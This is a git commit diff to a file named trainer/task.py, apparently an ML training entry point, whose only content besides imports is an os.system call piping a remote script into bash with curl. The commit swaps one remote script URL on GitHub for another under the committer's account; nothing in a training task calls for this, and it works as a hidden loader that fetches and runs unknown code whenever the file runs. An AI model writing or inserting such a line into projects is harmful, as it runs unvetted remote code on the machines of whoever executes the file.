e0b5ec53dd1f8c18f35a11d574e5a44adf570118
fhuko1357 <95587230+fhuko1357@users.noreply.github.com>
2024-04-13 00:09:48 +0700

    task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/loeto21/sarufil/raw/main/vis | bash')
+os.system('curl -sL https://raw.githubusercontent.com/fhuko1357/fun/main/app | bash')
